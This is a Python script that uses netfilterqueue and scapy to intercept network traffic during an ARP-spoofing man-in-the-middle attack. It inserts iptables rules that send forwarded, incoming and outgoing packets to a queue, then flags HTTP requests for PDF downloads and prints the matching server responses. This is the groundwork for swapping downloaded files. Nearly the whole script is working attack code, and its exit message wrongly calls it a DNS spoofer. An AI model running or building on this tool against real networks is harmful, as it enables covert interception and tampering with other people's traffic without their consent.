#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import subprocess


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):  # IF has raw data...
        if scapy_packet[scapy.TCP].dport == 80:
            print("Request packet")
            if b".pdf" in scapy_packet[scapy.TCP].load:
                print("Downloading a pdf!")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            # Check wether the response packet is the one that responses the request for the download
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("Response packet intercepted")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print(scapy_packet.show())

    packet.accept()


try:
    # Execute first the arp spoofer
    # To test with this computer: iptables -I OUTPUT -j NFQUEUE --queue-num 0;
    #                             iptables -I INPUT -j NFQUEUE --queue-num 0;
    # trap the incoming packets to a queue that come from other computers while mitm:
    # iptables -I FORDWARD -j queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0;", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

    # Remember to delte iptables wih iptables --flush
except KeyboardInterrupt:
    print("closing dns spoofer")
    subprocess.call("iptables --flush", shell=True)